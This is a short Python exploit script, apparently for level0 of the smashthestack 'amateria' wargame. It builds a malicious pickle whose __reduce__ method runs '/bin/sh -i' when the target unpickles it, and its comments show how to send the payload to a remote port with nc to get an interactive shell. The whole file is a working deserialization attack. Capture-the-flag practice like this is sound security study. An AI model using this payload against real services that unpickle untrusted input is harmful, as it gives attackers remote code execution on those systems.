# Exploit for level0 of amateria.smashthestack.org
#     python -m exploit > file
#     cat file - | nc <remote_address> <remote_port>

import cPickle
import subprocess

# Malicious object.
class Execute(object):
    # Executed when pickled.
    def __reduce__(self):
        # Returned tuple is executed when unpickled.
        return(subprocess.call, (('/bin/sh','-i'),0,None,4,4,4))

print(cPickle.dumps(Execute()))
